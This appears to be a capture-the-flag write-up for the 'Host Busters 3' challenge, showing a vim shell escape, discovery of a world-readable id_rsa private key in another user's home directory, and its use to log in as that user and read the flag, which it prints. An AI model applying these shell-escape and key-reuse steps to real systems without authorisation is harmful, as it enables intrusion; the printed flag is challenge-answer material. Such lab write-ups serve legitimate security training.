### Host Busters 3

Login as vim, escape vim.

`:!/bin/bash`

```
kali@kali:~$ ssh vim@gh0st404.deadface.io
vim@gh0st404.deadface.io's password:

vim@a5f852d7b453:~$ cd ..
vim@a5f852d7b453:/home$ ls -al
total 24
drwxrwxr-x 1 root      root      4096 Jul 29 23:05 .
drwxr-xr-x 1 root      root      4096 Oct 22 15:25 ..
drwxrwxr-x 1 gh0st404  gh0st404  4096 Jul 31 02:24 gh0st404
drwxrwxr-x 1 mort1cia  mort1cia  4096 Jul 29 23:05 mort1cia
drwxrwxr-x 1 spookyboi spookyboi 4096 Jul 31 02:24 spookyboi
drwxrwxr-x 1 vim       vim       4096 Jul 29 23:05 vim
vim@a5f852d7b453:/home$ cd gh0st404/
vim@a5f852d7b453:/home/gh0st404$ ls -al
total 60
drwxrwxr-x 1 gh0st404 gh0st404  4096 Jul 31 02:24 .
drwxrwxr-x 1 root     root      4096 Jul 29 23:05 ..
-rw------- 1 gh0st404 gh0st404   214 Jul 29 23:02 .bash_history
-rw-r--r-- 1 gh0st404 gh0st404   220 Apr 23 21:23 .bash_logout
-rw-r--r-- 1 gh0st404 gh0st404  3526 Apr 23 21:23 .bashrc
drwxrwxr-x 1 gh0st404 gh0st404  4096 Jul 29 23:05 .keys
-rw-r--r-- 1 gh0st404 gh0st404   807 Apr 23 21:23 .profile
drwx------ 1 gh0st404 gh0st404  4096 Jul 29 23:05 .ssh
-rw-rw-r-- 1 gh0st404 gh0st404    47 Jul 29 23:05 config
-rw------- 1 gh0st404 gh0st404    34 Jul 29 23:05 hostbusters3.txt
-rw-rw-r-- 1 gh0st404 gh0st404  2610 Jul 29 23:05 id_rsa
-rw-r--r-- 1 gh0st404 gh0st404   958 Jul 29 23:05 tgri-alive.xml
-rw-r--r-- 1 gh0st404 gh0st404 11650 Jul 29 23:05 tgri-scan.xml
```

Using the id_rsa file which world readable, we login as gh0st404 into the machine.

```
vim@a5f852d7b453:/home/gh0st404$ ssh -i id_rsa gh0st404@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:0mHE5uZoBUeZWuf9AnEP42DxVfDI1xhTG1X1f5exMwg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Linux a5f852d7b453 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st404@a5f852d7b453:~$ ls
config  hostbusters3.txt  id_rsa  tgri-alive.xml  tgri-scan.xml
gh0st404@a5f852d7b453:~$ cat hostbusters3.txt
flag{Embr4c3_th3_K3y_t0_5ucc355!}
```

### Flag

`flag{Embr4c3_th3_K3y_t0_5ucc355!}`
